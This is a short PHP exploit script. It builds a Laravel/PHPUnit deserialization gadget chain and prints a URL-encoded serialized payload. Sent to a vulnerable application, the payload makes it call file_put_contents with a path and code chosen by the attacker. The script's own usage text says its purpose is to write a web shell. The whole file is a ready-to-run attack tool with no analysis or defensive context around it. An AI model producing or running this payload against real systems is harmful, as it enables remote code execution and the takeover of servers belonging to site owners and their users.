<?php
/*
Author:monitor
description:
    laravel deserialization chain
*/
namespace Illuminate\Broadcasting
{
    class PendingBroadcast{
        protected $events;
        protected $event;
        public function __construct($events,$event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }

}

namespace Illuminate\Bus
{
    class Dispatcher{
        protected $queueResolver;
        public function __construct($queueResolver)
        {
            $this->queueResolver = $queueResolver;
        }
    }
}

namespace Illuminate\Queue
{
    class CallQueuedClosure{
        public $connection;
        public function __construct($connection)
        {
            $this->connection = $connection;
        }
    }
}

namespace PHPUnit\Framework\MockObject\Invocation
{
    class StaticInvocation{
        private $parameters;
        public function __construct($parameters)
        {
            $this->parameters=$parameters;
        }
    }
}

namespace PHPUnit\Framework\MockObject\Stub
{
    class ReturnCallback{
        private $callback;
        public function __construct($callback)
        {
            $this->callback=$callback;   
        }
    }
}

namespace
{   
    if($argc<3){
        echo "Description:\n\tUse laravel deserialization to write shell.";
        echo "\nUsage:" .$argv[0] . " <path> <code>";
        exit();
    }
    $path = $argv[1];
    $code = $argv[2];
    $staticInvocation = new PHPUnit\Framework\MockObject\Invocation\StaticInvocation(array($path,$code));
    $callQueued = new Illuminate\Queue\CallQueuedClosure($staticInvocation);
    $returncallback = new PHPUnit\Framework\MockObject\Stub\ReturnCallback("file_put_contents");
    $dispatcher = new Illuminate\Bus\Dispatcher(array($returncallback,"invoke"));
    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$callQueued);
    echo urlencode(serialize($pendingbroadcast));
}